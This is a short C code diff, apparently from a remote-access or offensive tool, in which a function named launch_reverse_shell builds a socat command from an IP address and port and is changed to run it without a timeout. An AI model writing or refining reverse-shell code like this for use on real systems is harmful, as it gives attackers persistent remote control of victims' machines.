@@ -100,7 +100,7 @@ int launch_reverse_shell(char *args) {
              SOCAT_BINARY_PATH, ip, port);
 
     // Launch the command
-    int ret_code = exec_str_as_command(cmd, false);
+    int ret_code = exec_str_as_command_no_timeout(cmd, false);
 
     if (ret_code < 0) {
         ERR_MSG("launch_reverse_shell: failed to start reverse shell on port %d\n",
